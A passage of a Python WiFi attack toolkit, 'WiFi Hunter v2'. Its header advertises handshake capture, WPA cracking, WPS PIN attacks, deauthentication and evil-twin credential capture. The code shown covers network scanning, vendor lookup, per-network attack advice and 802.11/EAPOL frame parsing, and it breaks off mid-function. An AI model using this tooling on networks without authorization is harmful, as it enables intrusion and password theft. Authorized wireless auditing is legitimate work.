#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  WiFi Hunter v2 - offline & live WiFi audit toolkit (pure stdlib core)

  subcommands:
    scan      list nearby networks (netsh / nmcli / iw / airport / pywifi)
    sniff     live capture or pcap analysis: APs, clients, probes, EAPOL frames
    capture   collect 4-way handshakes + PMKIDs (live or offline)
    hash      pcap -> hashcat 22000 hashes
    crack     offline WPA/WPA2/WPA3-PSK cracking: wordlist, rules, mask, bruteforce
    verify    test a single passphrase against captured hashes
    wps       WPS attacks: default/MAC-derived PINs, reaver/bully/pixiewps runner
    deauth    deauthentication frames (scapy / raw socket / Npcap)
    evil      evil twin + captive portal + automatic password verification
    keygen    router default-password generator from MAC/SSID
    report    HTML/JSON report from scan + cracked results
    doctor    capability check: monitor mode, Npcap, external tools, privileges
    selftest  crypto/parsing correctness tests with known vectors
    all       full chain: scan -> capture/hash -> crack -> report

  Use only on networks you own or are authorized to test.
"""
from __future__ import annotations

import argparse
import gzip
import hashlib
import hmac
import html
import itertools
import json
import math
import multiprocessing as mp
import os
import platform
import random
import re
import shutil
import socket
import string
import struct
import subprocess
import sys
import threading
import time
from collections import Counter, defaultdict
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any, Iterable, Iterator, Sequence

APP = "WIFI HUNTER"
VERSION = "2.1"
IS_WIN = os.name == "nt"
IS_LINUX = sys.platform.startswith("linux")
IS_MAC = sys.platform == "darwin"
IS_TERMUX = bool(os.environ.get("TERMUX_VERSION")) or "com.termux" in os.environ.get("PREFIX", "")
IS_ANDROID = IS_TERMUX or ("ANDROID_ROOT" in os.environ and not IS_WIN)
HERE = Path(__file__).resolve().parent
OUTDIR = Path(os.environ.get("HUNTER_OUT") or "hunter-out").expanduser()


def out(*parts: str) -> str:
    """default output path under $HUNTER_OUT."""
    return str(OUTDIR.joinpath(*parts))


# --------------------------------------------------------------------------------------
# colors / output helpers
# --------------------------------------------------------------------------------------
class C:
    R = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"
    WHT = "\033[97m"


_ANSI = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


def ansi_setup() -> None:
    global _ANSI
    if IS_WIN:
        try:
            import ctypes

            k = ctypes.windll.kernel32
            k.SetConsoleOutputCP(65001)  # utf-8 console, so persian ssids render
            if _ANSI:
                k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            _ANSI = False


def col(s: Any, code: str) -> str:
    s = str(s)
    return f"{code}{s}{C.R}" if _ANSI else s


def say(msg: str = "", end: str = "\n") -> None:
    print(msg, end=end, flush=True)


def ok(msg: str) -> None:
    say(f"{col('[+]', C.GRN)} {msg}")


def bad(msg: str) -> None:
    say(f"{col('[-]', C.RED)} {msg}")


def warn(msg: str) -> None:
    say(f"{col('[!]', C.YEL)} {msg}")


def info(msg: str) -> None:
    say(f"{col('[*]', C.CYN)} {msg}")


def step(msg: str) -> None:
    say(f"{col('[>]', C.MAG)} {msg}")


def hr(title: str = "", ch: str = "-", width: int = 78) -> None:
    if title:
        pad = max(0, width - len(title) - 2)
        left = pad // 2
        say(col(f"{ch * left} {title} {ch * (pad - left)}", C.DIM))
    else:
        say(col(ch * width, C.DIM))


def human(n: float) -> str:
    for unit in ("", "K", "M", "G", "T"):
        if abs(n) < 1000:
            return f"{n:,.0f}{unit}" if unit == "" else f"{n:,.1f}{unit}"
        n /= 1000.0
    return f"{n:.1f}P"


def human_time(sec: float) -> str:
    if sec < 0 or sec != sec or math.isinf(sec):
        return "?"
    sec = int(sec)
    if sec < 60:
        return f"{sec}s"
    if sec < 3600:
        return f"{sec // 60}m{sec % 60:02d}s"
    if sec < 86400:
        return f"{sec // 3600}h{(sec % 3600) // 60:02d}m"
    return f"{sec // 86400}d{(sec % 86400) // 3600:02d}h"


def run(cmd: Sequence[str], timeout: int = 120, input_text: str | None = None) -> tuple[int, str]:
    """run a command, return (rc, combined output). never raises."""
    flags = 0
    if IS_WIN:
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
    try:
        p = subprocess.run(
            list(cmd),
            capture_output=True,
            text=True,
            errors="replace",
            timeout=timeout,
            input=input_text,
            creationflags=flags,
        )
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except FileNotFoundError:
        return 127, f"{cmd[0]}: command not found"
    except subprocess.TimeoutExpired:
        return 124, "timeout"
    except Exception as e:  # noqa: BLE001
        return 1, f"{type(e).__name__}: {e}"


def have(tool: str) -> bool:
    return shutil.which(tool) is not None


def is_admin() -> bool:
    try:
        if IS_WIN:
            import ctypes

            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False


# --------------------------------------------------------------------------------------
# mac / channel helpers
# --------------------------------------------------------------------------------------
_MAC_RE = re.compile(r"(?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}")


def mac_bytes(s: str | bytes) -> bytes:
    if isinstance(s, bytes):
        return s
    h = re.sub(r"[^0-9a-fA-F]", "", s)
    if len(h) != 12:
        raise ValueError(f"bad mac address: {s!r}")
    return bytes.fromhex(h)


def mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def freq_to_channel(freq: int) -> int:
    if freq == 0:
        return 0
    if freq == 2484:
        return 14
    if 2400 <= freq <= 2500:
        return (freq - 2407) // 5
    if 4900 <= freq <= 5900:
        return (freq - 5000) // 5
    if 5925 <= freq <= 7125:
        return (freq - 5950) // 5
    return 0


def channel_to_freq(ch: int) -> int:
    if ch == 14:
        return 2484
    if 1 <= ch <= 13:
        return 2407 + 5 * ch
    if 32 <= ch <= 177:
        return 5000 + 5 * ch
    if 178 <= ch <= 233:
        return 5950 + 5 * ch
    return 0


def band_of(freq: int, hint: str = "") -> str:
    h = (hint or "").lower()
    if "5" in h and "ghz" in h:
        return "5GHz"
    if "6" in h and "ghz" in h:
        return "6GHz"
    if "2.4" in h and "ghz" in h:
        return "2.4GHz"
    if freq:
        if 2400 <= freq <= 2500:
            return "2.4GHz"
        if 4900 <= freq <= 5900:
            return "5GHz"
        if 5925 <= freq <= 7125:
            return "6GHz"
    return "2.4GHz"


def signal_bars(sig: int) -> str:
    n = 0 if sig <= 0 else 4 if sig >= 80 else 3 if sig >= 60 else 2 if sig >= 40 else 1
    return "#" * n + "." * (4 - n)


# small OUI table (radio vendor) - extend freely
OUIS: dict[str, str] = {
    "000c43": "Ralink", "001cdf": "Belkin", "0024b2": "Netgear", "0026f2": "Netgear",
    "000fb5": "Netgear", "001f33": "Netgear", "c03f0e": "Netgear", "9c3dcf": "Netgear",
    "0023cd": "TP-Link", "14cc20": "TP-Link", "60e327": "TP-Link", "f4f26d": "TP-Link",
    "50c7bf": "TP-Link", "a42bb0": "TP-Link", "c46e1f": "TP-Link", "ec086b": "TP-Link",
    "001d7e": "Cisco-Linksys", "000c41": "Cisco-Linksys", "48f8b3": "Linksys",
    "001e58": "D-Link", "002191": "D-Link", "1cbdb9": "D-Link", "340804": "D-Link",
    "b8a386": "D-Link", "f07d68": "D-Link", "ccb255": "D-Link",
    "000ee8": "Zyxel", "001349": "Zyxel", "5cf4ab": "Zyxel", "b0b2dc": "Zyxel",
    "001e10": "Huawei", "00259e": "Huawei", "0022a1": "Huawei", "00464b": "Huawei",
    "04bd70": "Huawei", "0c96bf": "Huawei", "18c58a": "Huawei", "20f3a3": "Huawei",
    "240995": "Huawei", "2c55d3": "Huawei", "3cdfbd": "Huawei", "48db50": "Huawei",
    "4c5499": "Huawei", "5c7d5e": "Huawei", "645e10": "Huawei", "6cb749": "Huawei",
    "70723c": "Huawei", "781dba": "Huawei", "7c6097": "Huawei", "84a8e4": "Huawei",
    "8c34fd": "Huawei", "904e2b": "Huawei", "9cb2b2": "Huawei", "a0f3c1": "Huawei",
    "ac4e91": "Huawei", "b41c56": "Huawei", "c88d83": "Huawei", "d02db3": "Huawei",
    "d4b709": "Huawei", "e0247f": "Huawei", "f83dff": "Huawei", "fce33c": "Huawei",
    "0018f9": "MikroTik", "085531": "MikroTik", "4c5e0c": "MikroTik", "6c3b6b": "MikroTik",
    "74f6a4": "MikroTik", "cc2de0": "MikroTik", "dc2c6e": "MikroTik", "e48d8c": "MikroTik",
    "001a2b": "Ubiquiti", "0418d6": "Ubiquiti", "24a43c": "Ubiquiti", "44d9e7": "Ubiquiti",
    "68725a": "Ubiquiti", "788a20": "Ubiquiti", "9c05d6": "Ubiquiti", "b4fbe4": "Ubiquiti",
    "dc9fdb": "Ubiquiti", "f09fc2": "Ubiquiti",
    "386b1c": "Mercusys", "007686": "Mercusys", "a887b1": "Mercusys", "204ef6": "Mercusys",
    "0c8268": "Tenda", "502b73": "Tenda", "c83a35": "Tenda", "c46e1f": "Mercusys",
    "000e5c": "ARRIS", "0014d1": "TRENDnet", "0019e0": "TRENDnet", "f02814": "Cisco",
    "00180a": "Cisco Meraki", "e8ba70": "Cisco", "8416f9": "TP-Link", "b0487a": "TP-Link",
    "bcd177": "TP-Link", "e894f6": "TP-Link", "e8de27": "TP-Link", "f0f336": "TP-Link",
    "f8d111": "TP-Link", "fc7c02": "TP-Link", "1c61b4": "TP-Link", "30b5c2": "Cisco",
    "b0be76": "ASUS", "001bfc": "ASUS", "2c56dc": "ASUS", "38674e": "ASUS", "38d547": "ASUS",
    "50465d": "ASUS", "5404a6": "ASUS", "704d7b": "ASUS", "74d02b": "ASUS", "ac220b": "ASUS",
    "d017c2": "ASUS", "f832e4": "ASUS",
}


def oui_vendor(mac: str) -> str:
    h = re.sub(r"[^0-9a-f]", "", (mac or "").lower())
    return OUIS.get(h[:6], "")


# --------------------------------------------------------------------------------------
# models
# --------------------------------------------------------------------------------------
@dataclass
class AP:
    bssid: str
    ssid: str = ""
    signal: int = 0
    channel: int = 0
    freq: int = 0
    band: str = ""
    auth: str = ""
    cipher: str = ""
    vendor: str = ""
    hidden: bool = False
    wps: bool | None = None
    pmf: bool | None = None
    radio: str = ""
    source: str = ""
    seen: int = 1
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    extra: dict = field(default_factory=dict)

    @property
    def sec(self) -> str:
        a = (self.auth or "").lower()
        if not a or "open" in a or a in ("none",):
            return "WEP" if "wep" in (self.cipher or "").lower() else "OPEN"
        if "wep" in a:
            return "WEP"
        has3 = "wpa3" in a or "sae" in a
        has2 = "wpa2" in a or "rsn" in a
        has1 = "wpa-" in a or a.strip() == "wpa" or "wpa " in a or "wpa/" in a
        if has3 and has2:
            return "WPA2/WPA3"
        if has3:
            return "WPA3"
        if has2:
            return "WPA2"
        if has1:
            return "WPA"
        return "?"

    @property
    def enc(self) -> str:
        c = (self.cipher or "").upper()
        if not c:
            return "-" if self.sec == "OPEN" else "?"
        for k in ("GCMP-256", "GCMP", "CCMP", "TKIP", "WEP"):
            if k in c:
                return k
        return c

    def advice(self) -> str:
        s = self.sec
        if s == "OPEN":
            return "open network - join directly"
        if s == "WEP":
            return "WEP - ARP replay with aircrack-ng, 1-5 min"
        if s == "WPA":
            return "WPA/TKIP - 4-way handshake + dictionary"
        if s == "WPA2":
            return "WPA2 - PMKID/handshake + dictionary or mask"
        if s == "WPA2/WPA3":
            return "mixed - PMKID / downgraded handshake possible"
        if s == "WPA3":
            return "WPA3-SAE - SAE handshake + dictionary (hcxdumptool)"
        return "unknown security"

    def to_dict(self) -> dict:
        d = asdict(self)
        d["sec"] = self.sec
        d["enc"] = self.enc
        d["advice"] = self.advice()
        return d


def ap_from_dict(d: dict) -> AP:
    return AP(**{k: v for k, v in d.items() if k in AP.__dataclass_fields__})


# --------------------------------------------------------------------------------------
# scanners
# --------------------------------------------------------------------------------------
def _clean_ssid(s: str) -> str:
    s = (s or "").strip()
    if s.lower() in ("<hidden>", "hidden", "<unknown>", "--", "", "none"):
        return ""
    return s


def parse_netsh_networks(text: str) -> list[AP]:
    """parse 'netsh wlan show networks mode=bssid' (tolerates localized labels)."""
    aps: list[AP] = []
    ssid = ""
    auth = ""
    cipher = ""
    cur: AP | None = None

    def flush() -> None:
        nonlocal cur
        if cur is not None:
            if not cur.ssid:
                cur.ssid = ssid
                cur.hidden = not bool(ssid)
            aps.append(cur)
            cur = None

    for raw in text.splitlines():
        s = raw.strip()
        if not s or ":" not in s:
            continue
        label, _, val = s.partition(":")
        label = label.strip()
        val = val.strip()
        low = label.lower()

        if re.match(r"^ssid\s+\d+$", low):
            flush()
            ssid = _clean_ssid(val)
            auth = cipher = ""
            continue

        if low.startswith("bssid"):
            flush()
            m = _MAC_RE.search(val)
            cur = AP(
                bssid=(m.group(0).lower() if m else ""),
                ssid=ssid,
                auth=auth,
                cipher=cipher,
                source="netsh",
                vendor=oui_vendor(m.group(0)) if m else "",
            )
            continue

        if cur is None:
            if low.startswith(("authentication", "type")):
                auth = val
            elif low.startswith(("encryption",)):
                cipher = val
            continue

        if low.startswith("signal") or "%" in val:
            m = re.search(r"(\d+)\s*%", val) or re.search(r"(\d+)", val)
            if m:
                cur.signal = int(m.group(1))
        elif low.startswith("channel"):
            m = re.search(r"(\d+)", val)
            if m:
                cur.channel = int(m.group(1))
        elif "ghz" in val.lower():
            cur.band = band_of(0, val)
        elif "802.11" in val:
            cur.radio = val.split()[0]
        elif low.startswith("bss load"):
            m = re.search(r"Stations:\s*(\d+)", val)
            if m:
                cur.extra["stations"] = int(m.group(1))
        elif low.startswith("freq"):
            m = re.search(r"(\d+)", val)
            if m:
                cur.freq = int(m.group(1))
        elif low.startswith("details"):
            if "H2E" in val:
                cur.extra["h2e"] = "H2E Not supported" not in val

    flush()
    for a in aps:
        if a.freq:
            a.channel = a.channel or freq_to_channel(a.freq)
        elif a.channel:
            a.freq = channel_to_freq(a.channel)
        a.band = a.band or band_of(a.freq)
    return [a for a in aps if a.bssid]


def list_ifaces_windows() -> list[dict]:
    rc, out = run(["netsh", "wlan", "show", "interfaces"])
    res: list[dict] = []
    cur: dict = {}
    for line in out.splitlines():
        s = line.strip()
        if not s:
            if cur:
                res.append(cur)
                cur = {}
            continue
        if ":" not in s:
            continue
        k, _, v = s.partition(":")
        k = k.strip()
        v = v.strip()
        if k == "Name" and cur:
            res.append(cur)
            cur = {}
        if k in ("Name", "Description", "GUID", "Physical address", "State", "SSID", "BSSID"):
            cur[k] = v
    if cur:
        res.append(cur)
    return [r for r in res if r.get("Name")]


def wifi_iface_name(preferred: str | None = None) -> str | None:
    if preferred:
        return preferred
    if IS_TERMUX:
        rc, out = run(["ip", "-o", "link", "show", "up"])
        for line in out.splitlines():
            m = re.match(r"\d+:\s+(wlan\d+)", line)
            if m:
                return m.group(1)
        return "wlan0"
    if IS_WIN:
        for i in list_ifaces_windows():
            return i.get("Name")
        return None
    if IS_LINUX:
        rc, out = run(["iw", "dev"])
        for line in out.splitlines():
            m = re.match(r"\s*Interface\s+(\S+)", line)
            if m:
                return m.group(1)
        rc, out = run(["nmcli", "-t", "-f", "DEVICE,TYPE", "device"])
        for line in out.splitlines():
            parts = line.split(":")
            if len(parts) >= 2 and parts[1] == "wifi":
                return parts[0]
        return None
    if IS_MAC:
        rc, out = run(["networksetup", "-listallhardwareports"])
        for b in out.split("\n\n"):
            if "Wi-Fi" in b or "AirPort" in b:
                m = re.search(r"Device:\s*(\S+)", b)
                if m:
                    return m.group(1)
    return None


def iface_guid_windows(name: str) -> str | None:
    for i in list_ifaces_windows():
        if i.get("Name", "").lower() == name.lower():
            return i.get("GUID")
    return None


def scan_netsh() -> list[AP]:
    rc, out = run(["netsh", "wlan", "show", "networks", "mode=bssid"])
    if rc != 0 and "visible" not in out:
        bad(out.strip()[:300])
    return parse_netsh_networks(out)


def _split_nmcli(line: str) -> list[str]:
    parts: list[str] = []
    cur = ""
    esc = False
    for ch in line:
        if esc:
            cur += ch
            esc = False
        elif ch == "\\":
            esc = True
        elif ch == ":":
            parts.append(cur)
            cur = ""
        else:
            cur += ch
    parts.append(cur)
    return parts


def scan_nmcli() -> list[AP]:
    rc, out = run(
        ["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,FREQ,SECURITY", "device", "wifi", "list", "--rescan", "yes"],
        timeout=90,
    )
    aps: list[AP] = []
    for line in out.splitlines():
        f = _split_nmcli(line)
        if len(f) < 6:
            continue
        ssid, bssid, sig, ch, freq, sec = f[:6]
        m = _MAC_RE.search(bssid)
        if not m:
            continue
        ap = AP(
            bssid=m.group(0).lower(),
            ssid=_clean_ssid(ssid),
            signal=int(sig) if sig.isdigit() else 0,
            channel=int(ch) if ch.isdigit() else 0,
            freq=int(freq) if freq.isdigit() else 0,
            auth=sec,
            cipher=("CCMP" if ("WPA2" in sec or "WPA3" in sec) else sec),
            source="nmcli",
            vendor=oui_vendor(m.group(0)),
        )
        ap.hidden = not ap.ssid
        ap.band = band_of(ap.freq)
        aps.append(ap)
    return aps


def scan_iw(iface: str) -> list[AP]:
    rc, out = run(["iw", "dev", iface, "scan"], timeout=90)
    if rc != 0:
        warn(out.strip()[:200])
        return []
    aps: list[AP] = []
    cur: AP | None = None
    for line in out.splitlines():
        m = re.match(r"^BSS\s+([0-9a-fA-F:]{17})", line)
        if m:
            if cur:
                aps.append(cur)
            cur = AP(bssid=m.group(1).lower(), source="iw", vendor=oui_vendor(m.group(1)))
            continue
        if cur is None:
            continue
        s = line.strip()
        if s.startswith("SSID:"):
            cur.ssid = _clean_ssid(s.split(":", 1)[1])
            cur.hidden = not cur.ssid
        elif s.startswith("freq:"):
            try:
                cur.freq = int(float(s.split(":", 1)[1]))
            except ValueError:
                cur.freq = 0
            cur.channel = freq_to_channel(cur.freq)
            cur.band = band_of(cur.freq)
        elif s.startswith("signal:"):
            try:
                cur.signal = max(0, min(100, int(2 * (float(s.split(":", 1)[1].split()[0]) + 100))))
            except Exception:
                pass
        elif s.startswith("RSN:"):
            cur.auth = "WPA2-Personal"
        elif s.startswith("WPA:"):
            cur.auth = cur.auth or "WPA-Personal"
        elif s.startswith("WPS:"):
            cur.wps = True
        elif "Authentication suites:" in s:
            cur.cipher = cur.cipher or "CCMP"
        elif "Management frame protection" in s:
            cur.pmf = True
    if cur:
        aps.append(cur)
    return aps


def scan_airport() -> list[AP]:
    airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
    rc, out = run([airport, "-s"])
    aps: list[AP] = []
    for line in out.splitlines()[1:]:
        if not line.strip():
            continue
        m = _MAC_RE.search(line)
        if not m:
            continue
        head = line[: m.start()]
        t = line[m.end():].split()
        ssid = head.strip()
        sig = int(t[0]) if t and re.fullmatch(r"-\d+", t[0]) else 0
        ch = t[1].split(",")[0] if len(t) > 1 else "0"
        sec = " ".join(t[3:]) if len(t) > 3 else ""
        ap = AP(
            bssid=m.group(0).lower(),
            ssid=_clean_ssid(ssid),
            signal=max(0, min(100, 2 * (sig + 100))),
            channel=int(ch) if ch.isdigit() else 0,
            auth=sec or "OPEN",
            source="airport",
            vendor=oui_vendor(m.group(0)),
        )
        ap.hidden = not ap.ssid
        ap.freq = channel_to_freq(ap.channel)
        ap.band = band_of(ap.freq)
        aps.append(ap)
    return aps


def scan_pywifi() -> list[AP]:
    try:
        import pywifi  # type: ignore
    except Exception:
        warn("pywifi not installed (pip install pywifi)")
        return []
    w = pywifi.PyWiFi()
    ifs = w.interfaces()
    if not ifs:
        warn("pywifi: no wireless interface")
        return []
    iface = ifs[0]
    iface.scan()
    time.sleep(4)
    aps: list[AP] = []
    for r in iface.scan_results():
        ap = AP(
            bssid=(r.bssid or "").lower(),
            ssid=_clean_ssid(r.ssid),
            signal=max(0, min(100, int(r.signal))),
            freq=int(getattr(r, "freq", 0) or 0),
            source="pywifi",
            vendor=oui_vendor(r.bssid or ""),
        )
        ap.channel = freq_to_channel(ap.freq)
        ap.band = band_of(ap.freq)
        ap.hidden = not ap.ssid
        akms = {int(a) for a in (getattr(r, "akm", []) or [])}
        if akms & {8, 9}:
            ap.auth = "WPA3-Personal"
        elif akms & {4, 6}:
            ap.auth = "WPA2-Personal"
        elif akms:
            ap.auth = "WPA-Personal"
        ap.cipher = "CCMP" if ap.auth != "OPEN" else ""
        aps.append(ap)
    return aps


def scan_termux() -> list[AP]:
    """Android via termux-api (pkg install termux-api + Termux:API app + location permission)."""
    if not have("termux-wifi-scaninfo"):
        bad("termux-wifi-scaninfo missing -> pkg install termux-api")
        say("  then install the Termux:API app and allow location for it")
        return []
    rc, out = run(["termux-wifi-scaninfo"], timeout=45)
    if rc != 0:
        bad(out.strip()[:200] or "termux-wifi-scaninfo failed")
        say("  check: Termux:API app installed? location permission granted? GPS on?")
        return []
    try:
        data = json.loads(out)
    except Exception:
        warn("unexpected scan output (is Termux:API installed?)")
        return []
    aps: list[AP] = []
    for r in data if isinstance(data, list) else []:
        bssid = (r.get("bssid") or "").lower()
        if not _MAC_RE.fullmatch(bssid):
            continue
        caps = str(r.get("capabilities") or "")
        rssi = int(r.get("rssi") or -100)
        freq = int(r.get("frequency") or 0)
        ap = AP(
            bssid=bssid,
            ssid=_clean_ssid(str(r.get("ssid") or "")),
            signal=max(0, min(100, 2 * (rssi + 100))),
            freq=freq,
            source="termux",
            vendor=oui_vendor(bssid),
        )
        ap.channel = freq_to_channel(freq)
        ap.band = band_of(freq)
        ap.hidden = not ap.ssid
        up = caps.upper()
        if "SAE" in up:
            ap.auth = "WPA3-Personal"
        elif "WPA2" in up:
            ap.auth = "WPA2-Personal"
        elif "WPA" in up:
            ap.auth = "WPA-Personal"
        elif "WEP" in up:
            ap.auth = "WEP"
            ap.cipher = "WEP"
        else:
            ap.auth = "OPEN"
        if "CCMP" in up or "AES" in up:
            ap.cipher = "CCMP"
        ap.wps = "WPS" in caps
        ap.pmf = "MFPR" in up or "MFP" in up
        aps.append(ap)
    if not aps:
        warn("no networks returned (GPS/location off?)")
    return aps


def scan_aps(source: str = "auto", iface: str | None = None) -> list[AP]:
    src = source
    if src == "auto":
        if IS_TERMUX:
            src = "termux"
        elif IS_WIN:
            src = "netsh"
        elif IS_LINUX:
            src = "iw" if (have("iw") and is_admin()) else ("nmcli" if have("nmcli") else "iw")
        elif IS_MAC:
            src = "airport"
        else:
            src = "netsh"

    if src == "netsh":
        aps = scan_netsh()
    elif src == "termux":
        aps = scan_termux()
    elif src == "nmcli":
        aps = scan_nmcli()
    elif src == "iw":
        aps = scan_iw(iface or wifi_iface_name() or "wlan0")
    elif src == "airport":
        aps = scan_airport()
    elif src == "pywifi":
        aps = scan_pywifi()
    else:
        bad(f"unknown scan source: {src}")
        aps = []

    merged: dict[str, AP] = {}
    for a in aps:
        key = a.bssid.lower() or f"ssid:{a.ssid}"
        if key in merged:
            old = merged[key]
            old.seen += 1
            old.signal = max(old.signal, a.signal)
            old.last_seen = time.time()
            for f_ in ("wps", "pmf", "radio", "vendor", "channel", "wps"):
                if getattr(a, f_, None) and not getattr(old, f_, None):
                    setattr(old, f_, getattr(a, f_))
        else:
            merged[key] = a
    return sorted(merged.values(), key=lambda x: (-x.signal, x.ssid.lower()))


def table(headers: Sequence[str], rows: Sequence[Sequence[str]], max_col: int = 30) -> None:
    srows = [[str(c) for c in r] for r in rows]
    width: list[int] = []
    for i, h in enumerate(headers):
        w = len(h)
        for r in srows:
            if i < len(r):
                plain = re.sub(r"\033\[[0-9;]*m", "", r[i])
                w = max(w, len(plain))
        width.append(min(w + 1, max_col))
    say(col(" ".join(h.ljust(width[i]) for i, h in enumerate(headers)), C.B))
    say(col(" ".join("-" * width[i] for i in range(len(headers))), C.DIM))
    for r in srows:
        out = []
        for i, cell in enumerate(r[: len(headers)]):
            plain = re.sub(r"\033\[[0-9;]*m", "", cell)
            cut = plain[: width[i] - 1] + ("..." if len(plain) > width[i] - 1 else "")
            out.append(cell.replace(plain, cut).ljust(width[i] + (len(cell) - len(plain))))
        say(" ".join(out))
    say("")


def print_ap_table(aps: list[AP], show_vendor: bool = True) -> None:
    if not aps:
        warn("no network found (radio off? too far? try again)")
        return
    narrow = term_cols() < 76
    rows = []
    for i, a in enumerate(aps, 1):
        ssid = a.ssid if a.ssid else col("<hidden>", C.DIM)
        wps = "?" if a.wps is None else ("yes" if a.wps else "no")
        if narrow:
            rows.append([str(i), ssid, a.bssid, f"{a.signal:3d}%", str(a.channel or "?"), a.sec, wps])
        else:
            rows.append(
                [
                    str(i),
                    ssid,
                    a.bssid,
                    f"{a.signal:3d}% {signal_bars(a.signal)}",
                    str(a.channel or "?"),
                    a.band,
                    a.sec,
                    a.enc,
                    wps,
                    (a.vendor if show_vendor else ""),
                ]
            )
    if narrow:
        table(["#", "SSID", "BSSID", "SIG", "CH", "SEC", "WPS"], rows, max_col=22)
    else:
        table(["#", "SSID", "BSSID", "SIG", "CH", "BAND", "SEC", "CIPHER", "WPS", "VENDOR"], rows)


# --------------------------------------------------------------------------------------
# 802.11 / RSN / EAPOL parsing
# --------------------------------------------------------------------------------------
LINKTYPE_ETHERNET = 1
LINKTYPE_IEEE802_11 = 105
LINKTYPE_IEEE802_11_RADIOTAP = 127
LINKTYPE_PPI = 192

AKM_NAMES = {
    1: "802.1X", 2: "PSK", 3: "FT-802.1X", 4: "FT-PSK", 5: "802.1X-SHA256",
    6: "PSK-SHA256", 7: "TDLS", 8: "SAE", 9: "FT-SAE", 11: "802.1X-SUITE-B-192",
    12: "SAE-EXT-KEY", 13: "FILSPMF", 14: "FILSPMF-SHA256", 15: "FILSPMF-SHA384",
}
CIPHER_NAMES = {0: "USE-GROUP", 1: "WEP40", 2: "TKIP", 4: "CCMP", 5: "WEP104", 8: "GCMP", 9: "GCMP-256"}

MGMT_ASSOC_REQ = 0
MGMT_ASSOC_RESP = 1
MGMT_REASSOC_REQ = 2
MGMT_PROBE_REQ = 4
MGMT_PROBE_RESP = 5
MGMT_BEACON = 8
MGMT_AUTH = 11


def strip_radiotap(frame: bytes) -> bytes:
    if len(frame) >= 8 and frame[0] == 0 and frame[1] == 0:
        rl = int.from_bytes(frame[2:4], "little")
        if 8 <= rl <= len(frame) and (rl > 8 or frame[4:8] == b"\x00\x00\x00\x00"):
            return frame[rl:]
    return frame


def parse_ies(data: bytes) -> list[tuple[int, bytes]]:
    out: list[tuple[int, bytes]] = []
    i, n = 0, len(data)
    while i + 2 <= n:
        eid = data[i]
        ln = data[i + 1]
        if i + 2 + ln > n:
            break
        out.append((eid, data[i + 2 : i + 2 + ln]))
        i += 2 + ln
        if eid == 0 and ln == 0 and i + 2 > n:
            break
    return out


def ie_get(ies: Sequence[tuple[int, bytes]], eid: int) -> bytes | None:
    for i, d in ies:
        if i == eid:
            return d
    return None


def ie_all(ies: Sequence[tuple[int, bytes]], eid: int) -> list[bytes]:
    return [d for i, d in ies if i == eid]


def _suite_name(suite, table):
    if len(suite) == 4 and suite[:3] == bytes([0x00, 0x0F, 0xAC]):
        return table.get(suite[3], hex(suite[3]))
    return suite.hex()


def parse_rsn(ie):
    r = {"akm": [], "pairwise": [], "group": "?", "pmkids": [], "mfpc": False, "mfpr": False}
    try:
        p = 2
        r["group"] = _suite_name(ie[p : p + 4], CIPHER_NAMES)
        p += 4
        cnt = int.from_bytes(ie[p : p + 2], "little")
        p += 2
        for _ in range(min(cnt, 8)):
            r["pairwise"].append(_suite_name(ie[p : p + 4], CIPHER_NAMES))
            p += 4
        cnt = int.from_bytes(ie[p : p + 2], "little")
        p += 2
        for _ in range(min(cnt, 8)):
            r["akm"].append(_suite_name(ie[p : p + 4], AKM_NAMES))
            p += 4
        if p + 2 <= len(ie):
            cap = int.from_bytes(ie[p : p + 2], "little")
            p += 2
            r["mfpc"] = bool(cap & 0x0080)
            r["mfpr"] = bool(cap & 0x0040)
        if p + 2 <= len(ie):
            cnt = int.from_bytes(ie[p : p + 2], "little")
            p += 2
            for _ in range(min(cnt, 8)):
                if p + 16 <= len(ie):
                    r["pmkids"].append(ie[p : p + 16])
                    p += 16
    except Exception:
        pass
    return r



def security_from_ies(ies: Sequence[tuple[int, bytes]], cap: int = 0) -> dict:
    out: dict[str, Any] = {"auth": "", "cipher": "", "wps": None, "pmf": None, "akm": []}
    rsn = ie_get(ies, 48)
    wpa = None
    for d in ie_all(ies, 221):
        if len(d) >= 4 and d[:4] == b"\x00\x50\xf2\x01":
            wpa = d[4:]
        elif len(d) >= 4 and d[:4] == b"\x00\x50\xf2\x04":
            out["wps"] = True
    if rsn:
        r = parse_rsn(rsn)
        out["akm"] = r["akm"]
        out["cipher"] = (r["pairwise"] or [r["group"]])[0]
        out["pmf"] = bool(r["mfpc"])
        if any(a.startswith("SAE") for a in r["akm"]):
            out["auth"] = "WPA3-Personal" if "PSK" in r["akm"] or "SAE" in r["akm"] else "WPA3"
        elif "PSK" in r["akm"] or "PSK-SHA256" in r["akm"]:
            out["auth"] = "WPA2-Personal"
        elif r["akm"]:
            out["auth"] = "WPA2-Enterprise"
    elif wpa:
        out["auth"] = "WPA-Personal"
        out["cipher"] = "TKIP"
    elif cap & 0x0010:
        out["auth"] = "WEP"
        out["cipher"] = "WEP"
    else:
        out["auth"] = "OPEN"
    if out["wps"] is None:
        out["wps"] = False
    return out


def parse_eapol(b: bytes) -> "EapolKey | None":
    if len(b) < 99 or b[1] != 3:
        return None
    ln = int.from_bytes(b[2:4], "big")
    if 4 + ln <= len(b):
        b = b[: 4 + ln]
    kd_len = int.from_bytes(b[97:99], "big")
    return EapolKey(
        ver=b[0],
        dtype=b[4],
        raw=b,
        key_info=int.from_bytes(b[5:7], "big"),
        key_len=int.from_bytes(b[7:9], "big"),
        replay=int.from_bytes(b[9:17], "big"),
        nonce=b[17:49],
        iv=b[49:65],
        rsc=b[65:73],
        key_id=b[73:81],
        mic=b[81:97],
